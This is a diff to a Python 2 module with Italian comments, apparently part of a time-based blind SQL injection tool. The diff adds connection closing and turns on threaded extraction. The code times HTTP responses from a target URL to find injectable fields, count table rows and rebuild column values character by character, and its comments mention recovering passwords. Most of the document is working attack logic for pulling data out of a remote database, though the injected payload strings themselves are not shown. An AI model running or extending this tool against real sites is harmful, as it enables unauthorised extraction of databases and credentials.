@@ -53,6 +53,7 @@ def checkVariableInjectable():
             start=time.time()
             re=requests.post("%s"%OptionConfiguration.destination[0],data=dataToSent)
             re.content
+            re.close()
             end=time.time()
 
             if((end-start)>=OptionConfiguration.timeToWait):
@@ -61,6 +62,7 @@ def checkVariableInjectable():
                 start = time.time()
                 re = requests.post("%s" % OptionConfiguration.destination[0], data=dataToSent)
                 re.content
+                re.close()
                 end = time.time()
 
                 if((end-start)>=OptionConfiguration.timeToWait):
@@ -78,6 +80,7 @@ def checkVariableInjectable():
                 start = time.time()
                 re = requests.post("%s" % OptionConfiguration.destination[0], data=dataToSent)
                 re.content
+                re.close()
                 end = time.time()
 
                 if((end-start)>=OptionConfiguration.timeToWait):
@@ -86,6 +89,7 @@ def checkVariableInjectable():
                     start = time.time()
                     re = requests.post("%s" % OptionConfiguration.destination[0], data=dataToSent)
                     re.content
+                    re.close()
                     end = time.time()
 
                     if ((end - start) >= OptionConfiguration.timeToWait):
@@ -108,6 +112,7 @@ def checkVariableInjectable():
             start = time.time()
             re = requests.get("%s?%s" %(OptionConfiguration.destination[0],data))
             re.content
+            re.close()
             end = time.time()
             if (end - start >= OptionConfiguration.timeToWait):
                 #print("The field '%s' appear injectable on Time Based Blind SQLi (value int)" % (key))
@@ -125,6 +130,7 @@ def checkVariableInjectable():
                 start = time.time()
                 re = requests.get("%s?%s" % (OptionConfiguration.destination[0], data))
                 re.content
+                re.close()
                 end = time.time()
                 # se e una stringa il campo come posso fare?
                 if(end-start>=OptionConfiguration.timeToWait):
@@ -169,6 +175,8 @@ def countValueofTablePost(nameTable,condizioneWhere):
 
                 start = time.time()
                 req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
+                req.content
+                req.close()
                 end = time.time()
 
                 #se succede allora il numero di righe e maggiore del massimo che ho impostato quindi
@@ -200,6 +208,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
 #                    print (end, start,mid)
@@ -209,6 +218,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
                         # controllo solo che non sia stato un ritardo di connessione
                         # se non lo e stato allora e sicuramenre il valore trovato
@@ -240,6 +250,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                     start=time.time()
                     req=requests.post("%s"%(OptionConfiguration.destination[0]),dataToSent)
                     req.content
+                    req.close()
                     end=time.time()
 
                     #sono nella ,eta superiore
@@ -247,6 +258,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
                         if ((end - start) >= OptionConfiguration.timeToWait):
                             min=mid+1
@@ -285,6 +297,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                 req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                 #print (dataToSent[OptionConfiguration.valueInjectable])
                 req.content
+                req.close()
                 end = time.time()
                 # se succede allora il numero di righe e' maggiore del massimo che ho impostato quindi
                 # devo cambiare gli estremi di ricerca
@@ -317,6 +330,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     #print (mid,end-start,max,min)
@@ -327,6 +341,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         if((end-start)>=OptionConfiguration.timeToWait):
@@ -354,6 +369,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     #print (dataToSent[OptionConfiguration.valueInjectable])
                     end = time.time()
                     #print (end-start)
@@ -364,6 +380,7 @@ def countValueofTablePost(nameTable,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -407,6 +424,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                 start = time.time()
                 req = requests.get("%s?%s" % (OptionConfiguration.destination[0],dataSent), dataToSent)
                 req.content
+                req.close()
                 end = time.time()
                 #print(end-start,max,"max")
                 #se succede questo allora dobbiamo cambiare gli estremi di configurazione
@@ -439,7 +457,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                     start = time.time()
                     req = requests.get("%s?%s" % (OptionConfiguration.destination[0],dataSent), dataToSent)
                     req.content
-
+                    req.close()
                     end = time.time()
 
                     #print (end-start,req.elapsed.total_seconds(),mid)
@@ -451,6 +469,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                         start = time.time()
                         req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # se succede questo allora lo abbiamo trovato
@@ -478,6 +497,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                     start=time.time()
                     req=requests.get("%s?%s"%(OptionConfiguration.destination[0],dataToSent))
                     req.content
+                    req.close()
                     end=time.time()
                     #print (dataToSent[OptionConfiguration.valueInjectable])
                     #sono nella ,eta superiore
@@ -488,6 +508,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                         start = time.time()
                         req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent))
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -525,6 +546,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                 start = time.time()
                 req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                 req.content
+                req.close()
                 end = time.time()
                 # print (end - start, min, max)
                 # dobbiamo cambiare gli estremi di scelti
@@ -559,6 +581,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                     start = time.time()
                     req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
                     #print (end - start, min, max)
                     # se succede questo allora lo abbiamo trovato
@@ -569,6 +592,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                         start = time.time()
                         req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
                         # print (end - start, min, max)
                         # se succede questo allora lo abbiamo trovato
@@ -600,6 +624,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                     dataSent=creaStringaGet(dataSent)
                     req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent))
                     req.content
+                    req.close()
                     end = time.time()
                     # sono nella ,eta superiore
 
@@ -609,6 +634,7 @@ def countValueofTableGet(nameTable,condizioneWhere):
                         dataSent = creaStringaGet(dataSent)
                         req = requests.get("%s?%s" % (OptionConfiguration.destination[0], dataSent))
                         req.content
+                        req.close()
                         end = time.time()
 
                         if ((end - start) >= OptionConfiguration.timeToWait):
@@ -661,12 +687,14 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
                     # se succede questo allora lo abbiamo trovato
                     if ((end - start) >= OptionConfiguration.timeToWait):
                         start=time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
                         if((end-start)>=OptionConfiguration.timeToWait):
                             trovato = True
@@ -692,6 +720,7 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # sono nella ,eta superiore
@@ -699,6 +728,7 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -732,6 +762,7 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
                     #print (end-start),mid
                     # se succede questo allora lo abbiamo trovato
@@ -739,6 +770,7 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
                         if ((end - start) >OptionConfiguration.timeToWait):
                             trovato = True
@@ -766,6 +798,7 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # sono nella ,eta superiore
@@ -773,6 +806,7 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -793,10 +827,12 @@ def searchValueofTablePost(numeroRighe,nomeTabella,nomeColonna,condizioneWhere):
             print "*",
         print ("")
         # senza thread
-        valori.append(ricostruisciParolaPOST(length,nomeTabella,nomeColonna,i,condizioneWhere))
+        if(OptionConfiguration.thread=="NO"):
+            valori.append(ricostruisciParolaPOST(length,nomeTabella,nomeColonna,i,condizioneWhere))
         # con i thread
-        #value = threadStart(length, nomeTabella, nomeColonna, i, condizioneWhere)
-        #valori.append(value)
+        else:
+            value = threadStart(length, nomeTabella, nomeColonna, i, condizioneWhere)
+            valori.append(value)
     return valori
 
 def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere):
@@ -840,6 +876,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
@@ -848,6 +885,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # se succede questo allora lo abbiamo trovato
@@ -875,6 +913,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # sono nella ,eta superiore
@@ -883,6 +922,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -916,6 +956,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
@@ -924,6 +965,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # se succede questo allora lo abbiamo trovato
@@ -951,6 +993,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0],data), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # sono nella ,eta superiore
@@ -959,6 +1002,7 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -977,10 +1021,12 @@ def searchValueofTableGet(numeroRighe, nomeTabella, nomeColonna,condizioneWhere)
         for l in range(length):
             print "*",
         print ("")
-        valori.append(ricostruisciParolaGET(length,nomeTabella,nomeColonna,i,condizioneWhere))
+        if(OptionConfiguration.thread=="NO"):
+            valori.append(ricostruisciParolaGET(length,nomeTabella,nomeColonna,i,condizioneWhere))
         # da controllare le pwd siccome la prima me la sbaglia sempre
-        #value=threadStart(length,nomeTabella,nomeColonna,i,condizioneWhere)
-        #valori.append(value)
+        else:
+            value=threadStart(length,nomeTabella,nomeColonna,i,condizioneWhere)
+            valori.append(value)
     return valori
 
 
@@ -1030,6 +1076,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
@@ -1037,6 +1084,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         #print (end, start, chr(mid),req.elapsed.total_seconds())
@@ -1069,6 +1117,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -1076,6 +1125,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                             start = time.time()
                             req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                             req.content
+                            req.close()
                             end = time.time()
 
                             # sono nella ,eta superiore
@@ -1117,6 +1167,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                     start = time.time()
                     req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                     req.content
+                    req.close()
                     end = time.time()
                     # se succede questo allora lo abbiamo trovato
                     #time of execution for control
@@ -1126,6 +1177,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
                         if ((end - start) >OptionConfiguration.timeToWait):
                             trovato = True
@@ -1156,6 +1208,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                         start = time.time()
                         req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -1163,6 +1216,7 @@ def ricostruisciParolaPOST(length,nomeTabella,nomeColonna,indice,condizioneWhere
                             start = time.time()
                             req = requests.post("%s" % (OptionConfiguration.destination[0]), dataToSent)
                             req.content
+                            req.close()
                             end = time.time()
 
                             # sono nella ,eta superiore
@@ -1226,6 +1280,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                     req.content
+                    req.close()
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
@@ -1236,6 +1291,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                         req.content
+                        req.close()
                         end = time.time()
 
                         # se succede questo allora lo abbiamo trovato
@@ -1268,6 +1324,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -1276,6 +1333,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                             start = time.time()
                             req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                             req.content
+                            req.close()
                             end = time.time()
 
                             # sono nella ,eta superiore
@@ -1318,6 +1376,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                     start = time.time()
                     req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                     req.content
+                    req.close()
                     end = time.time()
 
                     # se succede questo allora lo abbiamo trovato
@@ -1326,6 +1385,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                         req.content
+                        req.close()
                         end = time.time()
 
                         # se succede questo allora lo abbiamo trovato
@@ -1362,6 +1422,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                         start = time.time()
                         req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                         req.content
+                        req.close()
                         end = time.time()
 
                         # sono nella ,eta superiore
@@ -1371,6 +1432,7 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
                             start = time.time()
                             req = requests.post("%s?%s" % (OptionConfiguration.destination[0], data))
                             req.content
+                            req.close()
                             end = time.time()
 
                             # sono nella ,eta superiore
@@ -1392,79 +1454,39 @@ def ricostruisciParolaGET(length, nomeTabella, nomeColonna, indice,condizioneWhe
     return value
 
 
-def threadStart(length,nomeTabella,nomeColonna,indice,condizioneWhere):
-    import threading
-    import pythonThreadRicostruisciParola
-    threads=[]
+# rivedere questa parte per le password
+def threadStart(length, nomeTabella, nomeColonna, indice, condizioneWhere):
+        import threading
+        import pythonThreadRicostruisciParola
+        threads = []
 
-    # rivedere questa parte per le password
-    # non funziona a volte
-    for i in range(1,length+1):
-        if(length+1-i>4):
-            if(OptionConfiguration.methodSentData=="GET"):
-                t1=threading.Thread(name=str(i),target=pythonThreadRicostruisciParola.ricostruisciParolaGET,args=(i,nomeTabella,nomeColonna,indice,condizioneWhere,))
-                t2 = threading.Thread(name=str(i+1), target=pythonThreadRicostruisciParola.ricostruisciParolaGET,
-                                      args=(i+1, nomeTabella, nomeColonna, indice, condizioneWhere,))
-                t3 = threading.Thread(name=str(i+2), target=pythonThreadRicostruisciParola.ricostruisciParolaGET,
-                                      args=(i+2, nomeTabella, nomeColonna, indice, condizioneWhere,))
-                t4 = threading.Thread(name=str(i+3), target=pythonThreadRicostruisciParola.ricostruisciParolaGET,
-                                      args=(i+3, nomeTabella, nomeColonna, indice, condizioneWhere,))
-
-                t1.start()
-                t2.start()
-                t3.start()
-                t4.start()
-                t1.join()
-                t2.join()
-                t3.join()
-                t4.join()
-                i=i+3
-
+        # rivedere questa parte per le password
+        # non funziona a volte
+        for i in range(1, length + 1):
+            if (OptionConfiguration.methodSentData == "GET"):
+                t = threading.Thread(name=str(i), target=pythonThreadRicostruisciParola.ricostruisciParolaGET,
+                                     args=(i, nomeTabella, nomeColonna, indice, condizioneWhere,))
+                t.start()
+                threads.append(t)
             else:
-                t1 = threading.Thread(name=str(i), target=pythonThreadRicostruisciParola.ricostruisciParolaPOST,
-                                      args=(i, nomeTabella, nomeColonna, indice, condizioneWhere,))
-                t2 = threading.Thread(name=str(i + 1), target=pythonThreadRicostruisciParola.ricostruisciParolaPOST,
-                                      args=(i + 1, nomeTabella, nomeColonna, indice, condizioneWhere,))
-                t3 = threading.Thread(name=str(i + 2), target=pythonThreadRicostruisciParola.ricostruisciParolaPOST,
-                                      args=(i + 2, nomeTabella, nomeColonna, indice, condizioneWhere,))
-                t4 = threading.Thread(name=str(i + 3), target=pythonThreadRicostruisciParola.ricostruisciParolaPOST,
-                                      args=(i + 3, nomeTabella, nomeColonna, indice, condizioneWhere,))
+                t = threading.Thread(name=str(i), target=pythonThreadRicostruisciParola.ricostruisciParolaPOST,
+                                     args=(i, nomeTabella, nomeColonna, indice, condizioneWhere,))
+                t.start()
+                threads.append(t)
 
-                t1.start()
-                t2.start()
-                t3.start()
-                t4.start()
-                t1.join()
-                t2.join()
-                t3.join()
-                t4.join()
-                i = i + 3
-        else:
-            for j in (length+1)%i:
-                if (OptionConfiguration.methodSentData == "GET"):
-                    t=threading.Thread(name=str(i), target=pythonThreadRicostruisciParola.ricostruisciParolaGET,
-                                      args=(i, nomeTabella, nomeColonna, indice, condizioneWhere,))
-                    t.start()
-                    threads.append(t)
-                else:
-                    t = threading.Thread(name=str(i), target=pythonThreadRicostruisciParola.ricostruisciParolaPOST,
-                                         args=(i, nomeTabella, nomeColonna, indice, condizioneWhere,))
-                    t.start()
-                    threads.append(t)
+                # t.join()
 
-            i=length+1
+        for t in threads:
+            t.join()
 
-    for t in threads:
-        t.join()
+        value = ""
+        # print pythonThreadRicostruisciParola.datafinale
+        for i in range(1, length + 1):
+            value = value + pythonThreadRicostruisciParola.datafinale[i]
 
-    value=""
-    #print pythonThreadRicostruisciParola.datafinale
-    for i in range (1,length+1):
-        value=value+pythonThreadRicostruisciParola.datafinale[i]
-
-    print "Value find -> " + value;
-    print("")
-    return value;
+        print "Value find -> " + value;
+        print("")
+        return value;
 
 
 def searchNameAlldb():
